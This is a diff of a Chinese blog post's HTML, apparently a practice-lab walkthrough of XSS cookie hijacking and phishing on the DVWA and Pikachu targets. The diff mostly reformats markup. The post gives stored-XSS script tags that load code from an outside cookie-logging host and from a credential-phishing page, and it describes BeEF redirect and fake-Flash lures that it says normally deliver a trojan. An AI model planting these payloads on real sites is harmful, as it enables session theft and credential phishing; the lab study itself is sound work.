@@ -41,7 +41,6 @@
 <meta property="og:image" content="http://zh1yu.fun/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/8.png">
 <meta property="og:image" content="http://zh1yu.fun/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/17.png">
 <meta property="og:image" content="http://zh1yu.fun/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/11.png">
-<meta property="og:image" content="http://zh1yu.fun/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/18.png">
 <meta property="og:image" content="http://zh1yu.fun/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/9.png">
 <meta property="og:image" content="http://zh1yu.fun/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/12.png">
 <meta property="og:image" content="http://zh1yu.fun/2025/07/07/xss%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%B5%8B%E8%AF%95/13.png">
@@ -230,35 +229,72 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p> 这里用两个平台通过xss进行cookie的劫持和钓鱼演示</p>
+        <p>这里用两个平台通过xss进行cookie的劫持和钓鱼演示</p>
 <span id="more"></span>
-<h2 id="cookie劫持"><a href="#cookie劫持" class="headerlink" title="cookie劫持"></a>cookie劫持</h2><p>这里用到的是dvwa和<a target="_blank" rel="noopener" href="https://xssaq.com/平台">https://xssaq.com/平台</a></p>
+<h2 id="cookie劫持">cookie劫持</h2>
+<p>这里用到的是dvwa和https://xssaq.com/平台</p>
 <p>我们先来到dvwa的存储型xss，这里设置为low模式，然后在xssaq平台创建一个项目，然后使用<code>&lt;sCRiPt sRC=//xs.pe/f4y&gt;&lt;/sCrIpT&gt;</code>命令，输入到dvwa的存储型xss中</p>
-<p><img src="1.png" alt="图片"></p>
+<figure>
+<img src="1.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>当有其他用户访问到该存储型xss页面时，xssaq平台就会记录下该用户的cookie等信息</p>
-<p><img src="2.png" alt="图片"><img src="3.png" alt="图片"></p>
-<h2 id="flash钓鱼演示"><a href="#flash钓鱼演示" class="headerlink" title="flash钓鱼演示"></a>flash钓鱼演示</h2><p>需要用到kali中的<strong>Beef-xss</strong>工具，下载命令：<code>apt install beef-xss</code>，使用<code>beef-xss</code>命令打开，用户名beef，密码：自己下载时配置的，使用下面的命令执行</p>
-<p><img src="4.png" alt="图片"></p>
+<p><img src="2.png" alt="图片" /><img src="3.png" alt="图片" /></p>
+<h2 id="flash钓鱼演示">flash钓鱼演示</h2>
+<p>需要用到kali中的<strong>Beef-xss</strong>工具，下载命令：<code>apt install beef-xss</code>，使用<code>beef-xss</code>命令打开，用户名beef，密码：自己下载时配置的，使用下面的命令执行</p>
+<figure>
+<img src="4.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>将ip换成自己kali的ip地址，这里前端有长度限制，直接修改：</p>
-<p><img src="5.png" alt="图片"></p>
+<figure>
+<img src="5.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>当有其他用户访问（我们自己访问也算），beef上就有该记录了</p>
-<p><img src="6.png" alt="图片"></p>
-<h3 id="地址跳转"><a href="#地址跳转" class="headerlink" title="地址跳转"></a>地址跳转</h3><p>我们找到redirect命令，在右边填写跳转地址的相关信息</p>
-<p><img src="7.png" alt="图片"></p>
+<figure>
+<img src="6.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
+<h3 id="地址跳转">地址跳转</h3>
+<p>我们找到redirect命令，在右边填写跳转地址的相关信息</p>
+<figure>
+<img src="7.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>回到dvwa，就会发现跳转到ww.baidu.com</p>
-<p><img src="8.png" alt="图片"></p>
-<h3 id="flash钓鱼"><a href="#flash钓鱼" class="headerlink" title="flash钓鱼"></a>flash钓鱼</h3><p>找到beef上的flash命令，在网上找一张flash图片填入其地址，payload url一般是设置为下载木马的文件，这里就设置成baidu了</p>
-<p><img src="17.png" alt="图片"><img src="11.png" alt="图片"><img src="18.png" alt="图片"></p>
-<h3 id="pikachu钓鱼"><a href="#pikachu钓鱼" class="headerlink" title="pikachu钓鱼"></a>pikachu钓鱼</h3><p>在pikachu靶场上有一个钓鱼文件：<code>/pikachu/pkxss/xfish/fish.php</code>，我们这个这个来模拟钓鱼测试，下面是模拟登录页面：</p>
-<p><img src="9.png" alt="图片"></p>
+<figure>
+<img src="8.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
+<h3 id="flash钓鱼">flash钓鱼</h3>
+<p>找到beef上的flash命令，在网上找一张flash图片填入其地址，payload
+url一般是设置为下载木马的文件，这里就设置成baidu了</p>
+<p><img src="17.png" alt="图片" /><img src="11.png" alt="图片" /><img
+src="18.png" alt="图片" /></p>
+<h3 id="pikachu钓鱼">pikachu钓鱼</h3>
+<p>在pikachu靶场上有一个钓鱼文件：<code>/pikachu/pkxss/xfish/fish.php</code>，我们这个这个来模拟钓鱼测试，下面是模拟登录页面：</p>
+<figure>
+<img src="9.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>这里需要先安装一下<code>/pkxss/pkxss_install.php</code>（需要提前配置好数据库连接）</p>
-<p><img src="12.png" alt="图片"></p>
-<p><img src="13.png" alt="图片"></p>
+<figure>
+<img src="12.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
+<figure>
+<img src="13.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>我们在dvwa的存储型xss中插入</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;xxx&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="comment">//xxx是pikachhu演示的钓鱼地址，localhost要换成ip地址</span></span><br><span class="line"><span class="comment">//比如我的是：&lt;script src=&quot;http://192.168.130.1:92/pkxss/xfish/fish.php&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.130.1:92/pkxss/xfish/fish.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-<p><img src="14.png" alt="图片"><img src="15.png" alt="图片"></p>
+<p><img src="14.png" alt="图片" /><img src="15.png" alt="图片" /></p>
 <p>输入的账号密码，就会被记录到pikachu的后台</p>
-<p><img src="16.png" alt="图片"></p>
+<figure>
+<img src="16.png" alt="图片" />
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <p>但是钓鱼结果里面没显示登录的信息，有点怪怪的</p>
 
     </div>
